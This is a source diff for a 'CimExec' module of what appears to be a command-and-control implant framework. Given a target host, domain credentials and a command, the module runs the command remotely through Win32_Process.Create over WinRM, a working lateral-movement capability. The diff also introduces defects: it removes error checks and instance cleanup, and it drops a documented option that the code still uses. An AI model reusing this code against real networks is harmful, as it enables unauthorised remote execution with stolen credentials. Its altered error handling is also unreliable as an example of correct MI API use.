@@ -28,6 +28,7 @@ extern "C" __attribute__((visibility("default"))) CimExec* CimExecConstructor()
 }
 #endif
 
+
 CimExec::CimExec()
 #ifdef BUILD_TEAMSERVER
     : ModuleCmd(std::string(moduleNameCim), moduleHashCim)
@@ -37,8 +38,11 @@ CimExec::CimExec()
 {
 }
 
+
 CimExec::~CimExec() = default;
 
+
+// Uses WinRM over TCP 5985 (HTTP) or TCP 5986 (HTTPS);
 std::string CimExec::getInfo()
 {
     std::ostringstream oss;
@@ -47,7 +51,6 @@ std::string CimExec::getInfo()
     oss << "Invoke Win32_Process.Create using the native MI (CIM) API over WS-Man." << '\n';
     oss << "Options:" << '\n';
     oss << "  -h <host>            Remote host." << '\n';
-    oss << "  -n <namespace>      Namespace (default root/cimv2)." << '\n';
     oss << "  -c <command>        Command to execute." << '\n';
     oss << "  -a <arguments>      Arguments for the command." << '\n';
     oss << "  -u <user>           DOMAIN\\user credentials." << '\n';
@@ -57,6 +60,7 @@ std::string CimExec::getInfo()
 #endif
     return oss.str();
 }
+
 
 std::string CimExec::packParameters(const Parameters& params) const
 {
@@ -75,6 +79,7 @@ std::string CimExec::packParameters(const Parameters& params) const
     append(params.password);
     return packed;
 }
+
 
 CimExec::Parameters CimExec::unpackParameters(const std::string& data) const
 {
@@ -108,7 +113,7 @@ CimExec::Parameters CimExec::unpackParameters(const std::string& data) const
 
 int CimExec::init(std::vector<std::string>& splitedCmd, C2Message& c2Message)
 {
-#if defined(BUILD_TEAMSERVER) || defined(BUILD_TESTS)
+#if defined(BUILD_TEAMSERVER) || defined(BUILD_TESTS) || defined(C2CORE_BUILD_TESTS)
     std::vector<std::string> args = regroupStrings(splitedCmd);
     Parameters params;
     params.namespaceName = "root/cimv2";
@@ -177,15 +182,23 @@ int CimExec::init(std::vector<std::string>& splitedCmd, C2Message& c2Message)
 
 int CimExec::process(C2Message& c2Message, C2Message& c2RetMessage)
 {
+    std::string cmd = c2Message.cmd();
+    c2RetMessage.set_instruction(c2RetMessage.instruction()); 
+    c2RetMessage.set_cmd(cmd); 
+    
     Parameters params = unpackParameters(c2Message.cmd());
     std::string result;
+    bool error = 0;
 
 #ifdef _WIN32
-    result = invoke(params);
+    error = invoke(params, result);
 #else
     (void)params;
-    result = "CIM execution is only supported on Windows.\n";
+    result = "Only supported on Windows.\n";
 #endif
+
+    if(error)   
+        c2RetMessage.set_errorCode(error);
 
     c2RetMessage.set_instruction(c2Message.instruction());
     c2RetMessage.set_cmd(c2Message.cmd());
@@ -193,11 +206,32 @@ int CimExec::process(C2Message& c2Message, C2Message& c2RetMessage)
     return 0;
 }
 
+
+// --- Error codes ---
+#define ERROR_SUCCESS                     0
+#define ERROR_MI_APPLICATION_INIT         1
+#define ERROR_MI_DESTINATIONOPTIONS_NEW   2
+#define ERROR_MI_CREDENTIALS_ADD          3
+#define ERROR_MI_SESSION_NEW              4
+#define ERROR_MI_INSTANCE_NEW             5
+#define ERROR_MI_INSTANCE_ADDELEMENT      6
+#define ERROR_MI_OPERATION_GETINSTANCE    7
+#define ERROR_MI_OPERATION_FINALRESULT    8
+#define ERROR_UNKNOWN                     99
+
+
 int CimExec::errorCodeToMsg(const C2Message& c2RetMessage, std::string& errorMsg)
 {
-    errorMsg = c2RetMessage.returnvalue();
+#ifdef BUILD_TEAMSERVER
+    int errorCode = c2RetMessage.errorCode();
+    if(errorCode>0)
+    {
+        errorMsg = c2RetMessage.returnvalue();
+    }
+#endif
     return 0;
 }
+
 
 #ifdef _WIN32
 namespace
@@ -299,25 +333,61 @@ namespace
     }
 }
 
-std::string CimExec::invoke(const Parameters& params) const
+
+// +-------------------------------------------------------------+
+// | MI_Application (MI_Application_Initialize)                   |
+// |  → App handle (returned by MI_Application_Initialize)       |
+// +-------------------------------------------------------------+
+//                  │
+//                  ▼
+//      MI_Application_NewSession(..., &session)
+//                  │
+//                  ▼
+// +----------------+----------------+
+// |  MI_Session (WINRM/CIM)         |
+// |  (session handle represents the  |
+// |   remote management connection)  |
+// +---------------------------------+
+//                  │
+//                  ▼
+//   Build inParams (MI_Application_NewInstance / set CommandLine)
+//   CommandLine = "<cmd> <args> > C:\\Windows\\Temp\\out.txt 2>&1"
+//                  │
+//                  ▼
+// MI_Session_Invoke(session, namespace, "Win32_Process", "Create", inParams, &operation)
+//                  │
+//                  ▼
+// +----------------+----------------+
+// |  MI_Operation (async op handle)  |
+// |  (returned by MI_Session_Invoke;  |
+// |   must check operation.ft != nullptr) |
+// +---------------------------------+
+//                  │
+//                  ▼
+
+int CimExec::invoke(const Parameters& params, std::string& result) const
 {
     MI_Application app = MI_APPLICATION_NULL;
-    MI_Result result = MI_Application_Initialize(0, MI_T("C2CoreCimExec"), nullptr, &app);
-    if (result != MI_RESULT_OK)
+    MI_Result miResult = MI_Application_Initialize(0, MI_T("C2CoreCimExec"), nullptr, &app);
+    if (miResult != MI_RESULT_OK)
     {
-        return formatMiError(result, nullptr, nullptr);
+        result = formatMiError(miResult, nullptr, nullptr);
+        return ERROR_MI_APPLICATION_INIT;
     }
 
     MI_DestinationOptions destOptions = MI_DESTINATIONOPTIONS_NULL;
-    result = MI_Application_NewDestinationOptions(&app, &destOptions);
-    if (result != MI_RESULT_OK) {
+    miResult = MI_Application_NewDestinationOptions(&app, &destOptions);
+    if (miResult != MI_RESULT_OK)
+    {
+        result = formatMiError(miResult, nullptr, nullptr);
         MI_Application_Close(&app);
-        formatMiError(result, nullptr, nullptr);
+        return ERROR_MI_DESTINATIONOPTIONS_NEW;
     }
-    MI_DestinationOptions* destOptionsPtr = nullptr;
 
+    MI_DestinationOptions* destOptionsPtr = nullptr;
     std::wstring passwordWide;
     MI_UserCredentials credentials{};
+
     if (!params.username.empty())
     {
         DomainSplit split = splitDomainUser(params.username);
@@ -328,15 +398,13 @@ std::string CimExec::invoke(const Parameters& params) const
         credentials.credentials.usernamePassword.username = split.user.c_str();
         credentials.credentials.usernamePassword.password = passwordWide.c_str();
 
-        // Attach credentials to the destination options
-        // (function name may vary slightly by MI SDK; use the “Add…Credentials” helper for destination)
-        result = MI_DestinationOptions_AddDestinationCredentials(&destOptions, &credentials);
-        if (result != MI_RESULT_OK) {
+        miResult = MI_DestinationOptions_AddDestinationCredentials(&destOptions, &credentials);
+        if (miResult != MI_RESULT_OK)
+        {
+            result = formatMiError(miResult, nullptr, nullptr);
             MI_Application_Close(&app);
-            formatMiError(result, nullptr, nullptr);
-            return formatMiError(result, nullptr, nullptr);
+            return ERROR_MI_CREDENTIALS_ADD;
         }
-
 
         destOptionsPtr = &destOptions;
     }
@@ -345,17 +413,20 @@ std::string CimExec::invoke(const Parameters& params) const
     std::wstring namespaceWide = widen(params.namespaceName);
 
     MI_Session session = MI_SESSION_NULL;
-    result = MI_Application_NewSession(&app,
-                                       MI_T("WINRM"),
-                                       hostWide.c_str(),
-                                       destOptionsPtr,
-                                       nullptr,
-                                       nullptr,
-                                       &session);
-    if (result != MI_RESULT_OK)
+    miResult = MI_Application_NewSession(
+        &app,
+        L"WINRM",
+        hostWide.c_str(),
+        destOptionsPtr,
+        nullptr,
+        nullptr,
+        &session
+    );
+    if (miResult != MI_RESULT_OK)
     {
+        result = formatMiError(miResult, nullptr, nullptr);
         MI_Application_Close(&app);
-        return formatMiError(result, nullptr, nullptr);
+        return ERROR_MI_SESSION_NEW;
     }
 
     std::wstring commandLine = widen(params.command);
@@ -366,36 +437,40 @@ std::string CimExec::invoke(const Parameters& params) const
     }
 
     MI_Instance* inParams = nullptr;
-    result = MI_Application_NewInstance(&app, MI_T("Win32_Process_Create"), nullptr, &inParams);
-    if (result != MI_RESULT_OK)
+    miResult = MI_Application_NewInstance(&app, MI_T("Win32_Process_Create"), nullptr, &inParams);
+    if (miResult != MI_RESULT_OK)
     {
+        result = formatMiError(miResult, nullptr, nullptr);
         MI_Session_Close(&session, nullptr, nullptr);
         MI_Application_Close(&app);
-        return formatMiError(result, nullptr, nullptr);
+        return ERROR_MI_INSTANCE_NEW;
     }
 
     MI_Value commandValue;
     commandValue.string = (MI_Char*)commandLine.c_str();
-    result = MI_Instance_AddElement(inParams, MI_T("CommandLine"), &commandValue, MI_STRING, MI_FLAG_BORROW);
-    if (result != MI_RESULT_OK)
+    miResult = MI_Instance_AddElement(inParams, MI_T("CommandLine"), &commandValue, MI_STRING, MI_FLAG_BORROW);
+    if (miResult != MI_RESULT_OK)
     {
+        result = formatMiError(miResult, nullptr, nullptr);
         MI_Instance_Delete(inParams);
         MI_Session_Close(&session, nullptr, nullptr);
         MI_Application_Close(&app);
-        return formatMiError(result, nullptr, nullptr);
+        return ERROR_MI_INSTANCE_ADDELEMENT;
     }
 
     MI_Operation operation = MI_OPERATION_NULL;
-    MI_Session_Invoke(&session,
-                      0,
-                      nullptr,
-                      namespaceWide.c_str(),
-                      MI_T("Win32_Process"),
-                      MI_T("Create"),
-                      nullptr,
-                      inParams,
-                      nullptr,
-                      &operation);
+    MI_Session_Invoke(
+        &session,
+        0,
+        nullptr,
+        namespaceWide.c_str(),
+        MI_T("Win32_Process"),
+        MI_T("Create"),
+        nullptr,
+        inParams,
+        nullptr,
+        &operation
+    );
 
     MI_Boolean moreResults = MI_FALSE;
     MI_Result finalResult = MI_RESULT_OK;
@@ -409,25 +484,17 @@ std::string CimExec::invoke(const Parameters& params) const
 
     do
     {
-        getResult = MI_Operation_GetInstance(&operation,
-                                              (const MI_Instance**)&outputInstance,
-                                             &moreResults,
-                                             &finalResult,
-                                            (const MI_Char**)&errorMessage,
-                                             (const MI_Instance**)&errorDetails);
-        if (getResult != MI_RESULT_OK)
-        {
-            response.str(std::string());
-            response.clear();
-            response << formatMiError(getResult, errorMessage, errorDetails);
-            if (errorDetails != nullptr)
-            {
-                MI_Instance_Delete(errorDetails);
-            }
-            break;
-        }
+        MI_Operation_GetInstance(
+            &operation,
+            (const MI_Instance**)&outputInstance,
+            &moreResults,
+            &finalResult,
+            (const MI_Char**)&errorMessage,
+            (const MI_Instance**)&errorDetails
+        );
 
-        if (outputInstance != nullptr)
+
+        if (outputInstance)
         {
             MI_Value value;
             MI_Type type;
@@ -436,48 +503,38 @@ std::string CimExec::invoke(const Parameters& params) const
             if (MI_Instance_GetElement(outputInstance, MI_T("ReturnValue"), &value, &type, &flags, nullptr) == MI_RESULT_OK &&
                 type == MI_UINT32)
             {
-                response << "ReturnValue: " << value.uint32 << '\n';
+                response << "Ret: " << value.uint32 << '\n';
                 haveData = true;
             }
 
             if (MI_Instance_GetElement(outputInstance, MI_T("ProcessId"), &value, &type, &flags, nullptr) == MI_RESULT_OK &&
                 type == MI_UINT32)
             {
-                response << "ProcessId: " << value.uint32 << '\n';
+                response << "Pid: " << value.uint32 << '\n';
                 haveData = true;
             }
 
-            MI_Instance_Delete(outputInstance);
             outputInstance = nullptr;
         }
 
-        if (errorDetails != nullptr)
+        if (errorDetails)
         {
-            MI_Instance_Delete(errorDetails);
             errorDetails = nullptr;
         }
-    }
-    while (moreResults == MI_TRUE);
 
-    if (finalResult != MI_RESULT_OK && getResult == MI_RESULT_OK)
-    {
-        response << formatMiError(finalResult, errorMessage, errorDetails);
-        if (errorDetails != nullptr)
-        {
-            MI_Instance_Delete(errorDetails);
-        }
-    }
+    } while (moreResults == MI_TRUE);
+ 
+    if (!haveData)
+        response << "No output.\n";
 
-    if (!haveData && response.str().empty())
-    {
-        response << "Command executed with no output.\n";
-    }
+    result = response.str();
 
     MI_Operation_Close(&operation);
     MI_Instance_Delete(inParams);
     MI_Session_Close(&session, nullptr, nullptr);
     MI_Application_Close(&app);
 
-    return response.str();
+    return ERROR_SUCCESS;
 }
+
 #endif
